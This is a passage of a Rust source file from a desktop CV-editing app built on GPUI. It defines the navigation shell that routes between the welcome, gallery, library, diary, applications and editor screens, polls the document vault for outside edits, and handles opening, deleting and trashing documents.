//! The top-level navigation shell.
//!
//! `Shell` owns which [`Screen`] is showing and routes to it. It is what the
//! window opens; the editor, setup, gallery, etc. are screens hosted inside it.
//! On first launch it shows the welcome → setup flow; once a vault is chosen it
//! remembers it (via `config`) and opens straight into the editor next time.

use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use gpui::{
    div, ease_out_quint, linear_color_stop, linear_gradient, prelude::*, px, Animation,
    AnimationExt, AnyElement, App, Context, Entity, PathPromptOptions, Subscription, Task, Window,
};

use dockcv_ui_components::{TextFieldEvent, TextFieldState};

use crate::config;
use crate::resume::export_names::{plan_batch, OnCollision};
use crate::resume::model::{DiaryEntry, ResumeDoc, SectionKind};
use crate::resume::template;
use crate::theme::ActiveTheme;
use crate::theme::ThemeMode;
use crate::typst_engine::{PageGeometry, TypstEngine};
use crate::vault;

use super::applications_data::{ApplicationSort, ApplicationsView};
use super::applications_pin::PinPick;
use super::confirm;
use super::diary_capture::DiaryPaste;
use super::diary_use::DiaryUse;
use super::gallery_sort::GallerySort;
use super::import_flow::ImportStep;
use super::library::LibrarySort;
use super::library_edit::LibraryEdit;
use super::library_link::PushReview;
use super::preset_matrix_export::BatchExportSheet;
use super::save_status;
use super::update_notice::UpdateState;
use super::vault_cache::{Fingerprint, VaultCache};
use super::{EditorEvent, Root};


/// The rail's four destinations, as a type `app.rs` can name.
///
/// [`Screen`] itself stays crate-private — it carries entities and half its
/// variants are not places you can navigate *to*. This is the subset the
/// keyboard and the rail actually address.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum VaultScreen {
    Cvs,
    Library,
    Diary,
    Applications,
}

pub(super) enum Screen {
    /// Before the vault has been looked at.
    ///
    /// Exists so `Shell::new` can touch no filesystem: it runs *before*
    /// `open_window`, so anything it blocks on delays the first frame — and on
    /// macOS a vault under `~/Documents` means the OS raises its own consent
    /// dialog, which then appears with no application behind it (L-16). The
    /// backdrop only, for the frame or two it takes; showing `Welcome` here
    /// would flash the wrong screen at everyone who already has a vault.
    Opening,
    Welcome,
    Setup,
    Gallery,
    Library,
    Diary,
    Applications,
    Editor(Entity<Root>),
    /// Boxed: the matrix carries a whole `ResumeDoc`, and an inline variant
    /// would make every `Screen` that large.
    PresetMatrix(Box<super::preset_matrix::PresetMatrix>),
}

pub struct Shell {
    pub(super) screen: Screen,
    /// The batch export sheet (`preset_matrix_export.rs`): `Some` between
    /// choosing a folder and confirming the list of files it will receive.
    pub(super) batch_export: Option<super::preset_matrix_export::BatchExportSheet>,
    /// The active vault directory once chosen.
    pub(super) vault: Option<PathBuf>,
    /// Watches the vault for edits made outside DockCV, while the window is in
    /// front. See [`Shell::watch_vault`].
    vault_watch: Option<Task<()>>,
    /// Starts and stops that watch as the window comes and goes. Registered on
    /// the first frame, because it needs a `Window`.
    vault_watch_activation: Option<Subscription>,
    /// Which document the gallery is renaming inline, if any.
    pub(super) renaming_doc: Option<PathBuf>,
    /// The rename box. One field reused across cards — only one rename can be
    /// open at a time, and a field per card would be a field per document.
    pub(super) rename_field: Option<Entity<TextFieldState>>,
    /// Whether the gallery is showing the "new document" template chooser.
    pub(super) gallery_creating: bool,
    /// A version being renamed from its row on the front door.
    pub(super) renaming_version: Option<super::front_door_version::VersionRename>,
    /// The CV the app would reopen on its own — `config`'s `last_document`,
    /// held here so the front door does not read the config file per frame.
    pub(super) last_opened: Option<PathBuf>,
    /// The `Tailor for a job` sheet, when it is open over the front door.
    pub(super) tailoring: Option<super::tailor::TailorSheet>,
    /// Current step in the import wizard (bring document / review split).
    pub(super) import_step: ImportStep,
    /// Whether the user/avatar dropdown menu is open.
    pub(super) menu_open: bool,
    pub(super) setup_error: Option<String>,
    /// Gallery search box. Created on the first frame — building a text field
    /// needs a `Window`, which `new` does not have.
    pub(super) search: Option<Entity<TextFieldState>>,
    /// Library block search, created the same way. Deliberately *not* the
    /// gallery's box: with the rail making these tabs of one window rather
    /// than separate pages, a query typed on one screen would otherwise stay
    /// live and silently filter the other when the user tabbed across.
    pub(super) library_search: Option<Entity<TextFieldState>>,
    /// What to call the section built from lines the importer could not place.
    ///
    /// An unstructured leftover has no label to propose — a line from a contact
    /// block is just a line — so the person names it. Lazily built here with
    /// the other inputs, for the same reason they are: a `TextFieldState` needs
    /// a `Window`, and `ImportStep` is set from places that have none.
    pub(super) import_section_name: Option<Entity<TextFieldState>>,
    /// Library filter chip in force; `None` is the design's `All`.
    pub(super) library_filter: Option<SectionKind>,
    /// How blocks are ordered inside each section group.
    pub(super) library_sort: LibrarySort,
    /// How the gallery is ordered. Seeded from `config.rs` and written
    /// back when it changes: a sort you chose and lost on relaunch is a
    /// control that does not work.
    pub(super) gallery_sort: GallerySort,
    /// The open block form — new when its index is `None`, otherwise an edit.
    pub(super) library_edit: Option<LibraryEdit>,
    /// The "which CVs should take this?" dialog, open only just after a
    /// library block that other documents copy was saved (US-03).
    pub(super) library_push: Option<PushReview>,
    /// What the rail has to say about versions this session (`update_notice`).
    pub(super) update: UpdateState,
    /// The open "which CV did you send?" picker.
    pub(super) pin_pick: Option<PinPick>,
    /// Mirror of `config.library_helper_dismissed`, read once at startup.
    /// Held in memory because the library screen consults it every frame, and
    /// a config file read per frame is a file read per frame.
    pub(super) library_helper_dismissed: bool,
    /// Quick-capture box on the diary screen, created the same way.
    pub(super) diary_draft: Option<Entity<TextFieldState>>,
    /// The quick-capture's `# tag` box — space- or comma-separated.
    pub(super) diary_tags: Option<Entity<TextFieldState>>,
    /// The role the quick-capture will tag the next entry with. Sticky across
    /// entries on purpose: a session of logging wins is almost always about
    /// one job, so re-picking it per entry would be friction for nothing.
    pub(super) diary_role: String,
    /// Timeline filter from the rail's `Roles` list; `None` shows everything.
    pub(super) diary_role_filter: Option<String>,
    /// The open `Use in a CV` sheet, if any.
    pub(super) diary_use: Option<DiaryUse>,
    /// The open paste-and-triage sheet (US-34), if any.
    pub(super) diary_paste: Option<DiaryPaste>,
    /// Diary search box. Its own, not shared: a query typed here must not
    /// follow the user to the library when they tab across.
    pub(super) diary_search: Option<Entity<TextFieldState>>,
    /// Applications board search box, created the same way — filters by
    /// company/role, and (like `library_search`) deliberately not shared
    /// with any other screen's box.
    pub(super) applications_search: Option<Entity<TextFieldState>>,
    /// Which of the Applications screen's three surfaces is showing.
    pub(super) applications_view: ApplicationsView,
    /// The order the board's columns and the list both use. One setting for
    /// both, so switching views never silently re-orders the same rows.
    pub(super) applications_sort: ApplicationSort,
    /// How far back Insights counts. Not persisted: it is a way of looking,
    /// not a property of the vault.
    pub(super) applications_period: super::applications_funnel::Period,
    /// The open detail panel, if any — the fields it is editing live with it,
    /// so closing the panel drops them.
    pub(super) applications_detail: Option<super::applications_detail::ApplicationDetail>,
    /// Which column's compose box is open, if any. `None` means the board
    /// shows no inline "new application" form.
    /// The compose box's two fields — company and role, the only two a new
    /// card starts with (design doc's "Build these" instruction).
    /// Kept alive so the boxes keep reporting changes.
    pub(super) input_subscriptions: Vec<Subscription>,
    /// How many pages each reading in the vault lays out into, keyed by
    /// `(document, preset name)` — `None` for a document with no presets.
    ///
    /// This replaced a cache of rasterized first-page thumbnails. The front
    /// door lists readings and shows what each one costs in paper, so it needs
    /// a measurement per *reading* rather than a picture per document — and
    /// measuring is the cheaper half of what the thumbnail pass was already
    /// doing, since it laid every document out and threw the geometry away.
    pub(super) reading_pages: HashMap<(PathBuf, Option<String>), PageGeometry>,
    /// Shared engine for laying documents out (fonts load once).
    pub(super) thumb_engine: Option<Arc<Mutex<TypstEngine>>>,
    pub(super) reading_task: Option<Task<()>>,
    /// Structural history stacks (undo, redo) per document path for the session.
    pub(super) undo_histories: HashMap<PathBuf, (Vec<ResumeDoc>, Vec<ResumeDoc>)>,
    /// The document currently open in the editor (to invalidate its thumbnail
    /// when we return).
    pub(super) editing_path: Option<PathBuf>,
    /// The vault, parsed once per change instead of once per frame. Refreshed
    /// at the top of `render`; every screen reads it rather than the disk.
    pub(super) cache: VaultCache,
}

/// How often the vault is checked for edits made outside DockCV, **while the
/// window is in front**.
///
/// The work is genuinely small — a directory of nine TOML files fingerprints in
/// 18 µs on a background thread, which at two ticks a second is 0.004% of one
/// core and 130 ms of CPU an hour. What is not small is doing it forever: a
/// timer that fires twice a second keeps waking a process that has nothing to
/// do, and a wakeup costs more than the work in it. Almost every one of those
/// ticks finds nothing, because almost nobody edits the vault from outside.
///
/// So it runs while somebody is looking at the app and not otherwise, which is
/// the honest reading of what it is for: nobody needs a preview refreshed on a
/// window they are not in front of. Coming back to the window checks once,
/// immediately — so switching from the editor you made the change in to DockCV
/// always shows the change, whatever the tick was doing.
const VAULT_WATCH_INTERVAL: Duration = Duration::from_millis(500);

impl Shell {
    /// Notice edits made to the vault by anything that is not DockCV.
    ///
    /// The README's promise is that the vault is plain text you can edit in any
    /// editor, and half of keeping it is not overwriting those edits
    /// (`vault::save`). This is the other half: seeing them. Without it the
    /// cache only re-read on the next frame — which happens when somebody moves
    /// the mouse, not when the file changes — so a document rewritten by
    /// another editor, or by an assistant working on the TOML directly, sat
    /// there stale until the window was touched.
    ///
    /// Polling rather than a filesystem-event API, and deliberately. A vault is
    /// a handful of small files, so the poll is free; events are not delivered
    /// reliably on the network and cloud-synced folders a vault is most likely
    /// to live in, which is exactly where somebody else's edit comes from; and
    /// every backend would have to be bridged onto GPUI's executor anyway. The
    /// cheap thing that always works beats the clever thing that usually does.
    fn watch_vault(&mut self, cx: &mut Context<Self>) {
        if self.vault_watch.is_some() {
            return;
        }
        let executor = cx.background_executor().clone();
        self.vault_watch = Some(cx.spawn(async move |this, cx| {
            // The first reading is a baseline, not a change: everything on disk
            // at that moment is what we just loaded.
            let mut seen: Option<Fingerprint> = None;
            loop {
                executor.timer(VAULT_WATCH_INTERVAL).await;
                let Ok(Some(dir)) = this.read_with(cx, |shell, _| shell.vault.clone()) else {
                    // No vault yet, or the window has gone. Only the second is
                    // a reason to stop.
                    if this.read_with(cx, |_, _| ()).is_err() {
                        return;
                    }
                    continue;
                };
                let taken = executor.spawn(async move { Fingerprint::of(&dir) }).await;
                if seen.as_ref() == Some(&taken) {
                    continue;
                }
                let first = seen.is_none();
                seen = Some(taken);
                if first {
                    continue;
                }
                if this
                    .update(cx, |this, cx| this.vault_changed_on_disk(cx))
                    .is_err()
                {
                    return;
                }
            }
        }));
    }

    /// Follow the window: watch while it is in front, stop when it is not, and
    /// look once on the way back in.
    ///
    /// Registered from `render`, which is the only place with a `Window`. The
    /// same reason `ensure_inputs` lives there.
    pub(super) fn ensure_vault_watch(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        if self.vault_watch_activation.is_some() {
            return;
        }
        self.vault_watch_activation =
            Some(cx.observe_window_activation(window, |this, window, cx| {
                if window.is_window_active() {
                    // Whatever happened while we were away, happened. Read it
                    // now rather than up to one interval later: this is the
                    // moment somebody looks.
                    this.vault_changed_on_disk(cx);
                    this.watch_vault(cx);
                } else {
                    this.vault_watch = None;
                }
            }));
    }

    /// Something in the vault is not what it was.
    ///
    /// Two things follow, and only one of them is this method's own work. The
    /// notify makes a frame happen, and `Shell::render` re-reads the vault into
    /// the cache as it always has — so the gallery, library, diary and
    /// applications all update by the path they already used. The editor is
    /// separate because it holds a document of its own; it is told to look, and
    /// looks on its next frame, where it has the `Window` a recompile needs.
    fn vault_changed_on_disk(&mut self, cx: &mut Context<Self>) {
        if let Screen::Editor(editor) = &self.screen {
            editor.update(cx, |editor, cx| {
                editor.external_change_pending = true;
                cx.notify();
            });
        }
        cx.notify();
    }

    pub fn new(cx: &mut Context<Self>) -> Self {
        // `~/.config`, not the vault: a small file in a directory macOS does
        // not gate. Reading it here is what lets the *vault* wait.
        let config = config::load();
        let library_helper_dismissed = config.library_helper_dismissed;
        let recorded = config.vault.clone();

        // The vault is opened after the window exists, and off the main
        // thread. `Shell::new` runs before `open_window`, so a blocking read
        // here is a frame that never gets painted — and on macOS the first
        // read of a vault under `~/Documents` blocks in `open()` while the OS
        // asks the user for consent, which is a dialog naming an app that is
        // not on screen yet (L-16).
        cx.spawn(async move |this, cx| {
            let executor = cx.background_executor().clone();
            let resolved = executor
                .spawn(async move {
                    let dir = recorded.filter(|d| vault::is_vault(d))?;
                    let count = vault::list_documents(&dir).len();
                    Some((dir, count))
                })
                .await;
            let _ = this.update(cx, |this, cx| this.finish_opening(resolved, cx));
        })
        .detach();

        Self {
            batch_export: None,
            screen: Screen::Opening,
            vault: None,
            vault_watch: None,
            vault_watch_activation: None,
            renaming_doc: None,
            rename_field: None,
            gallery_creating: false,
            renaming_version: None,
            last_opened: config::load().last_document,
            tailoring: None,
            import_step: ImportStep::default(),
            menu_open: false,
            setup_error: None,
            search: None,
            library_search: None,
            import_section_name: None,
            library_filter: None,
            library_sort: LibrarySort::default(),
            gallery_sort: GallerySort::from_word(&config::load().gallery_sort),
            library_edit: None,
            library_push: None,
            update: UpdateState::default(),
            pin_pick: None,
            library_helper_dismissed,
            diary_draft: None,
            diary_tags: None,
            diary_role: String::new(),
            diary_role_filter: None,
            diary_use: None,
            diary_paste: None,
            diary_search: None,
            applications_search: None,
            applications_view: ApplicationsView::default(),
            applications_sort: ApplicationSort::default(),
            applications_period: Default::default(),
            applications_detail: None,
            input_subscriptions: Vec::new(),
            reading_pages: HashMap::new(),
            thumb_engine: None,
            reading_task: None,
            undo_histories: HashMap::new(),
            editing_path: None,
            cache: VaultCache::default(),
        }
    }

    /// Build the screens' text boxes on the first frame and keep their changes
    /// flowing back into the shell.
    pub(super) fn ensure_inputs(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        if self.search.is_none() {
            let search = cx.new(|cx| TextFieldState::single_line(window, cx));
            // The grid filters on every keystroke, so a change is a re-render.
            self.input_subscriptions.push(
                cx.subscribe(&search, |_this, _field, _event: &TextFieldEvent, cx| {
                    cx.notify()
                }),
            );
            self.search = Some(search);
        }

        if self.rename_field.is_none() {
            let field = cx.new(|cx| TextFieldState::single_line(window, cx));
            self.input_subscriptions.push(cx.subscribe_in(
                &field,
                window,
                |this, _field, event: &TextFieldEvent, window, cx| match event {
                    TextFieldEvent::Submitted => this.commit_rename(window, cx),
                    TextFieldEvent::Changed => cx.notify(),
                    _ => {}
                },
            ));
            self.rename_field = Some(field);
        }

        if self.diary_search.is_none() {
            let field = cx.new(|cx| TextFieldState::single_line(window, cx));
            self.input_subscriptions.push(
                cx.subscribe(&field, |_this, _field, _event: &TextFieldEvent, cx| {
                    cx.notify()
                }),
            );
            self.diary_search = Some(field);
        }

        if self.import_section_name.is_none() {
            let field = cx.new(|cx| TextFieldState::single_line(window, cx));
            field.update(cx, |field, cx| field.seed("Notes", window, cx));
            self.input_subscriptions.push(
                cx.subscribe(&field, |_this, _field, _event: &TextFieldEvent, cx| {
                    cx.notify()
                }),
            );
            self.import_section_name = Some(field);
        }

        if self.library_search.is_none() {
            let search = cx.new(|cx| TextFieldState::single_line(window, cx));
            self.input_subscriptions.push(
                cx.subscribe(&search, |_this, _field, _event: &TextFieldEvent, cx| {
                    cx.notify()
                }),
            );
            self.library_search = Some(search);
        }

        if self.diary_draft.is_none() {
            let draft = cx.new(|cx| TextFieldState::single_line(window, cx));
            self.input_subscriptions.push(cx.subscribe_in(
                &draft,
                window,
                |this, _field, event: &TextFieldEvent, window, cx| match event {
                    TextFieldEvent::Submitted => this.commit_diary_entry(window, cx),
                    TextFieldEvent::Changed => cx.notify(),
                    _ => {}
                },
            ));
            self.diary_draft = Some(draft);
        }

        if self.diary_tags.is_none() {
            let tags = cx.new(|cx| TextFieldState::single_line(window, cx));
            // Enter in the tag box commits the whole win, same as in the text
            // box — the two are one form.
            self.input_subscriptions.push(cx.subscribe_in(
                &tags,
                window,
                |this, _field, event: &TextFieldEvent, window, cx| match event {
                    TextFieldEvent::Submitted => this.commit_diary_entry(window, cx),
                    TextFieldEvent::Changed => cx.notify(),
                    _ => {}
                },
            ));
            self.diary_tags = Some(tags);
        }

        if self.applications_search.is_none() {
            let search = cx.new(|cx| TextFieldState::single_line(window, cx));
            self.input_subscriptions.push(
                cx.subscribe(&search, |_this, _field, _event: &TextFieldEvent, cx| {
                    cx.notify()
                }),
            );
            self.applications_search = Some(search);
        }
    }

    /// The gallery's current search query, lowercased and trimmed.
    /// How many library blocks carry the gallery's current query.
    ///
    /// The same matcher the Library screen uses, over the same cache — a second
    /// definition of "matches" would drift, and the gallery would start
    /// promising hits the Library then failed to show.
    pub(super) fn library_hits(&self, query: &str) -> usize {
        if query.is_empty() {
            return 0;
        }
        let library = self.cache.library();
        super::library::POOLS
            .iter()
            .flat_map(|&(section, _)| super::library::cards_for(library, section))
            .filter(|card| card.haystack().contains(query))
            .count()
    }

    /// Open the Library with `query` already in its box.
    ///
    /// Carrying the query across is the whole gesture: the gallery said blocks
    /// match, and arriving at an unfiltered Library would make the user type it
    /// again to see the thing they were just told about.
    pub(super) fn open_library_with(
        &mut self,
        query: String,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        self.ensure_inputs(window, cx);
        self.ensure_vault_watch(window, cx);
        if let Some(field) = self.library_search.clone() {
            field.update(cx, |field, cx| field.seed(query, window, cx));
        }
        self.screen = Screen::Library;
        cx.notify();
    }

    pub(super) fn search_query(&self, cx: &App) -> String {
        self.search
            .as_ref()
            .map(|f| f.read(cx).value(cx).trim().to_lowercase())
            .unwrap_or_default()
    }

    /// The library's current search query, lowercased and trimmed.
    pub(super) fn library_query(&self, cx: &App) -> String {
        self.library_search
            .as_ref()
            .map(|f| f.read(cx).value(cx).trim().to_lowercase())
            .unwrap_or_default()
    }

    /// Measure every reading in the vault, in the background, once.
    ///
    /// The front door says what each reading costs in paper, and the only way
    /// to know is to lay it out. This is the same pass that used to rasterize a
    /// thumbnail per document, doing less work: `measure` stops after layout,
    /// where the old one went on to produce a pixmap it only ever showed at
    /// half scale.
    ///
    /// One document is loaded once and measured through each of its presets,
    /// rather than reloaded per reading — a vault of five CVs with three
    /// readings each is fifteen layouts, and five file reads.
    pub(super) fn ensure_reading_pages(&mut self, cx: &mut Context<Self>) {
        if self.reading_task.is_some() {
            return;
        }
        if self.vault.is_none() {
            return;
        }
        // From the cache, not a fresh `read_dir`: this runs on every front-door
        // frame, and the cache was refreshed a few lines earlier in `render`.
        let documents = self.cache.document_paths();
        // Entries for documents that have since been deleted or renamed away
        // would otherwise sit in the map for the life of the process.
        self.reading_pages
            .retain(|(path, _), _| documents.contains(path));
        let pending: Vec<PathBuf> = self
            .cache
            .metadata()
            .iter()
            .filter(|meta| {
                let mut keys = meta
                    .presets
                    .iter()
                    .map(|preset| (meta.path.clone(), Some(preset.name.clone())))
                    .peekable();
                if keys.peek().is_none() {
                    return !self.reading_pages.contains_key(&(meta.path.clone(), None));
                }
                keys.any(|key| !self.reading_pages.contains_key(&key))
            })
            .map(|meta| meta.path.clone())
            .collect();
        if pending.is_empty() {
            return;
        }

        let engine = self
            .thumb_engine
            .get_or_insert_with(|| Arc::new(Mutex::new(TypstEngine::new(String::new()))))
            .clone();
        let profiles = self.cache.profiles().clone();
        let executor = cx.background_executor().clone();

        self.reading_task = Some(cx.spawn(async move |this, cx| {
            for path in pending {
                let measured = executor
                    .spawn({
                        let engine = engine.clone();
                        let path = path.clone();
                        let profiles = profiles.clone();
                        async move {
                            let doc = vault::load(&path).ok()?;
                            let mut engine =
                                engine.lock().unwrap_or_else(|e| e.into_inner());
                            let mut out: Vec<(Option<String>, PageGeometry)> = Vec::new();
                            // Through the catalog, not `generate_for`: a
                            // reading on a vault profile lays out differently,
                            // and measuring it against the document's own
                            // layout would put a page count on the row that
                            // the exported PDF then disagrees with.
                            if doc.presets.is_empty() {
                                engine.set_source(template::generate_for_with_profiles(
                                    &doc, &profiles,
                                ));
                                out.push((None, engine.measure().ok()?));
                                return Some(out);
                            }
                            for (index, preset) in doc.presets.iter().enumerate() {
                                let mut reading = doc.clone();
                                reading.apply_preset(index);
                                engine.set_source(template::generate_for_with_profiles(
                                    &reading, &profiles,
                                ));
                                // A reading that will not compile gets no
                                // number rather than a zero — the same rule the
                                // matrix's headers follow.
                                if let Ok(geometry) = engine.measure() {
                                    out.push((Some(preset.name.clone()), geometry));
                                }
                            }
                            Some(out)
                        }
                    })
                    .await;
                let _ = this.update(cx, |this, cx| {
                    for (preset, geometry) in measured.unwrap_or_default() {
                        this.reading_pages.insert((path.clone(), preset), geometry);
                    }
                    cx.notify();
                });
            }
            let _ = this.update(cx, |this, _cx| this.reading_task = None);
        }));
    }

    /// Switch palettes. The theme is a `Global`, so setting it repaints every
    /// screen at once — nothing has to be pushed into the open editor.
    pub(super) fn set_theme(&mut self, mode: ThemeMode, cx: &mut Context<Self>) {
        if cx.theme().mode == mode {
            return;
        }
        crate::theme::set_theme_mode(cx, mode);
        config::set_theme(mode);
        cx.notify();
    }

    /// Permanently remove everything in the vault's `.trash`.
    ///
    /// The one button in DockCV that destroys data outright — deleting a
    /// document only moves it here — so it is the one that asks first, and the
    /// dialog says how many files are about to go.
    pub(super) fn empty_trash(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let Some(vault) = self.vault.clone() else {
            return;
        };
        let count = vault::trash_count(&vault);
        if count == 0 {
            return;
        }
        confirm::destructive(
            format!(
                "Permanently delete {count} deleted {}?",
                if count == 1 { "CV" } else { "CVs" }
            ),
            format!(
                "{} Everything in the vault's .trash folder is removed from disk. \
                 To keep any of it, move it out in Finder first.",
                confirm::CANNOT_UNDO
            ),
            "Empty Trash",
            window,
            cx,
            move |_this, _window, cx| {
                save_status::record(cx, "trash", vault::empty_trash(&vault));
                cx.notify();
            },
        );
    }

    /// Start a new CV — the gallery's template chooser, reached from ⌘N and
    /// the File menu as well as the gallery's own button.
    pub fn start_new_cv(&mut self, cx: &mut Context<Self>) {
        if self.vault.is_none() {
            return;
        }
        self.screen = Screen::Gallery;
        self.gallery_creating = true;
        cx.notify();
    }

    /// Show the vault folder in Finder.
    ///
    /// US-09: the user must always be able to see the real path *and* open it.
    /// Settings has shown the path since O-21; this is the other half, and it
    /// is the answer to "where are my files" that does not involve retyping a
    /// path into a Go-to-Folder box.
    pub fn reveal_vault(&mut self, cx: &mut Context<Self>) {
        if let Some(vault) = self.vault.clone() {
            cx.open_with_system(&vault);
        }
    }

    /// Forget every page measurement, so the front door re-measures.
    pub(super) fn rebuild_thumbnails(&mut self, _window: &mut Window, cx: &mut Context<Self>) {
        self.reading_pages.clear();
        cx.notify();
    }

    pub(super) fn duplicate_doc(&mut self, path: PathBuf, cx: &mut Context<Self>) {
        if vault::duplicate_document(&path).is_ok() {
            cx.notify();
        }
    }

    pub(super) fn delete_doc(&mut self, path: PathBuf, cx: &mut Context<Self>) {
        if vault::delete_document(&path).is_ok() {
            self.reading_pages.retain(|(p, _), _| *p != path);
            cx.notify();
        }
    }

    pub(super) fn commit_diary_entry(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let Some(field) = self.diary_draft.clone() else {
            return;
        };
        let text = field.read(cx).value(cx).trim().to_string();
        if text.is_empty() {
            return;
        }
        let tag_field = self.diary_tags.clone();
        let tags = tag_field
            .as_ref()
            .map(|f| parse_tags(&f.read(cx).value(cx)))
            .unwrap_or_default();

        if let Some(vault) = self.vault.clone() {
            let mut diary = vault::load_diary(&vault);
            diary.entries.insert(
                0,
                DiaryEntry {
                    date: vault::today_iso(),
                    text,
                    role: self.diary_role.clone(),
                    tags,
                    confidential: false,
                    used_in: Vec::new(),
                    // Typed straight into the Diary — no document was open.
                    source_doc: None,
                },
            );
            save_status::record(cx, "diary", vault::save_diary(&vault, &diary));
        }
        field.update(cx, |state, cx| state.seed("", window, cx));
        if let Some(tag_field) = tag_field {
            tag_field.update(cx, |state, cx| state.seed("", window, cx));
        }
        // The role deliberately survives the commit — see `diary_role`.
        cx.notify();
    }

    /// Flip an entry's confidential mark (US-36).
    ///
    /// A mark, not a redaction: the wording stays exactly where it is, in the
    /// diary, which is the point — you keep the record you need for a
    /// performance review, and what goes outward is a different sentence.
    pub(super) fn toggle_diary_confidential(&mut self, index: usize, cx: &mut Context<Self>) {
        let Some(vault) = self.vault.clone() else {
            return;
        };
        let mut diary = vault::load_diary(&vault);
        let Some(entry) = diary.entries.get_mut(index) else {
            return;
        };
        entry.confidential = !entry.confidential;
        save_status::record(cx, "diary", vault::save_diary(&vault, &diary));
        cx.notify();
    }

    pub(super) fn delete_diary_entry(&mut self, index: usize, cx: &mut Context<Self>) {
        let Some(vault) = self.vault.clone() else {
            return;
        };
        let mut diary = vault::load_diary(&vault);
        remove_at(&mut diary.entries, index);
        save_status::record(cx, "diary", vault::save_diary(&vault, &diary));
        cx.notify();
    }

    /// Land the vault the startup task went looking for.
    ///
    /// The counterpart to [`Shell::new`] deferring it: `Some` means the
    /// remembered directory is still a vault and the gallery can open, `None`
    /// means it is gone, was never set, or could not be read — all of which
    /// lead to Welcome, because from here they are the same situation for the
    /// user even though the log tells them apart.
    fn finish_opening(&mut self, resolved: Option<(PathBuf, usize)>, cx: &mut Context<Self>) {
        match resolved {
            Some((dir, documents)) => {
                // The line that says which vault a report is about.
                log::info!("vault restored: {} ({documents} documents)", dir.display());
                self.vault = Some(dir);
                self.screen = Screen::Gallery;
                // Open into the CV the app was last in, not into a list of
                // one. The reading needs no second field: applying a preset
                // writes the document's active variants, so the file already
                // is the reading it was left in (C6). A path that has since
                // been deleted or renamed simply does not open, and the front
                // door is what the person sees — which is the right answer to
                // "the file I had open is gone".
                if let Some(last) = config::load().last_document {
                    if last.is_file() {
                        self.open_doc(last, cx);
                    }
                }
            }
            None => {
                log::info!("no usable vault recorded — starting at Welcome");
                self.screen = Screen::Welcome;
            }
        }
        cx.notify();
    }

    /// Adopt `vault_dir` as the active vault: remember it and show the gallery.
    pub(super) fn open_vault(&mut self, vault_dir: PathBuf, cx: &mut Context<Self>) {
        config::set_vault(vault_dir.clone());
        let is_empty = vault::list_documents(&vault_dir).is_empty();
        // The first line of any useful report: which vault, and how much is in
        // it. A count, never a name — see `logging`'s content rule.
        log::info!(
            "vault opened: {} ({} documents)",
            vault_dir.display(),
            vault::list_documents(&vault_dir).len()
        );
        self.vault = Some(vault_dir);
        self.gallery_creating = is_empty;
        self.screen = Screen::Gallery;
        cx.notify();
    }

    /// Open a specific document in the editor, returning to the gallery when
    /// the editor asks to.
    ///
    /// The document is loaded **here**, before the editor entity exists, and a
    /// failure leaves the user where they are. `Root` used to load its own file
    /// and answer a parse failure by seeding the bundled AltaCV sample *and
    /// writing it to that path* — so a typo in a document the product
    /// advertises as hand-editable was replaced by sample data on one click,
    /// and the gallery happily routed a card marked "unreadable file" straight
    /// into it. A document that will not parse is a document to leave alone.
    /// Open a document, showing it at `preset` when the caller named one.
    ///
    /// The gallery's preset chips are the only caller that names one: the card
    /// itself opens the document as it was left, which is what a card has
    /// always done.
    pub(super) fn open_doc_at(
        &mut self,
        doc_path: PathBuf,
        preset: Option<usize>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        self.open_doc(doc_path, cx);
        if let (Some(index), Screen::Editor(editor)) = (preset, &self.screen) {
            let editor = editor.clone();
            editor.update(cx, |root, cx| root.open_at_preset(index, window, cx));
        }
    }

    pub(super) fn open_doc(&mut self, doc_path: PathBuf, cx: &mut Context<Self>) {
        let doc = match vault::load(&doc_path) {
            Ok(doc) => doc,
            Err(message) => {
                save_status::report_unreadable(cx, &doc_path, message);
                cx.notify();
                return;
            }
        };
        save_status::clear_open_failure(cx);

        let history = self.undo_histories.get(&doc_path).cloned();
        self.editing_path = Some(doc_path.clone());
        config::set_last_document(Some(doc_path.clone()));
        self.last_opened = Some(doc_path.clone());
        let editor = cx.new(move |cx| {
            let mut root = Root::new(doc_path, doc, cx);
            if let Some((undo, redo)) = history {
                root.undo_stack = undo;
                root.redo_stack = redo;
            }
            root
        });
        cx.subscribe(&editor, |this, editor, event, cx| match event {
            EditorEvent::BackToGallery => {
                // Flush before leaving, exactly as the matrix arm below does.
                // Saves are debounced by 600 ms on a `Task` the editor entity
                // owns, and switching `self.screen` drops that entity — so
                // without this the last keystrokes before clicking back were
                // simply cancelled. The sibling arm has always done this and
                // documented why; this one did not, which made "back" the one
                // exit that quietly lost work.
                this.flush_editor(&editor, cx);

                // Editing changes what the document's readings cost, so its
                // measurements go and the front door takes them again.
                if let Some(path) = this.editing_path.take() {
                    this.reading_pages.retain(|(p, _), _| *p != path);
                }
                this.screen = Screen::Gallery;
                cx.notify();
            }
            // P-01: the toolbar's preset menu is a door into the Preset
            // Matrix, scoped to the document currently open in the editor.
            EditorEvent::OpenPresetMatrix => {
                // The matrix re-reads the document from disk, so an unflushed
                // write would show it the state before the last keystrokes.
                this.flush_editor(&editor, cx);
                if let Some(path) = this.editing_path.clone() {
                    this.open_preset_matrix(path, cx);
                }
            }
        })
        .detach();
        self.screen = Screen::Editor(editor);
        cx.notify();
    }

    /// Switch to one of the rail's destinations, from anywhere.
    ///
    /// Routed through here rather than by assigning `self.screen` because
    /// leaving the editor has to flush first: writes are debounced on a task
    /// the editor entity owns, and dropping that entity cancels it. ⌘1–⌘4 must
    /// not be the one exit that loses the last keystrokes.
    pub fn go_to(&mut self, screen: VaultScreen, cx: &mut Context<Self>) {
        // Not from Welcome or Setup: there is no vault yet, and the rail those
        // chords belong to is not on screen.
        if matches!(
            self.screen,
            Screen::Opening | Screen::Welcome | Screen::Setup
        ) {
            return;
        }
        if let Screen::Editor(editor) = &self.screen {
            let editor = editor.clone();
            self.flush_editor(&editor, cx);
            if let Some(path) = self.editing_path.take() {
                self.reading_pages.retain(|(p, _), _| *p != path);
            }
        }
        self.screen = match screen {
            VaultScreen::Cvs => Screen::Gallery,
            VaultScreen::Library => Screen::Library,
            VaultScreen::Diary => Screen::Diary,
